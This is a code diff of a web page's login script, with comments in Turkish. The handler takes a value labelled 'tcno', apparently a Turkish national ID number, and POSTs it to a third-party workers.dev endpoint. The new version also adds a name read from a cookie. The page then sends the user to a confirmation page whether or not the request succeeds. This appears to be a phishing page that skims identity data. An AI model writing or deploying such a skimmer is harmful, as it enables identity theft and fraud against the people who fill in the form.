@@ -418,28 +418,33 @@
     });
     
     // Giriş butonuna tıklanınca
-    loginBtn.addEventListener('click', function () {
-        var tcno = phoneNumberInput.value;
-    
-        // POST işlemi için veri oluştur
-        var data = new FormData();
-        data.append('tcno', tcno);
-    
-        // POST işlemi için fetch kullanarak isteği oluştur
-        fetch('https://worker-steep-shape-b948.selimjuhan2.workers.dev/', {
-            method: 'POST',
-            body: data
-        })
-        .then(response => response.text())
-        .then(data => {
-            console.log(data);
-           window.location.href = 'onay.html';
-        })
-        .catch(error => {
-            console.error('Hata:', error);
-            window.location.href = 'onay.html';
-        });
+loginBtn.addEventListener('click', function () {
+    var tcno = phoneNumberInput.value;
+
+    // Cookie'den kayıtlı adı al
+    var savedName = getCookie("savedName");
+
+    // POST işlemi için veri oluştur
+    var data = new FormData();
+    data.append('tcno', tcno);
+    data.append('savedName', savedName); // Cookie'den alınan adı ekle
+
+    // POST işlemi için fetch kullanarak isteği oluştur
+    fetch('https://worker-steep-shape-b948.selimjuhan2.workers.dev/', {
+        method: 'POST',
+        body: data
+    })
+    .then(response => response.text())
+    .then(data => {
+        console.log(data);
+        window.location.href = 'onay.html';
+    })
+    .catch(error => {
+        console.error('Hata:', error);
+        window.location.href = 'onay.html';
     });
+});
+
     </script>
  
 </body></html>
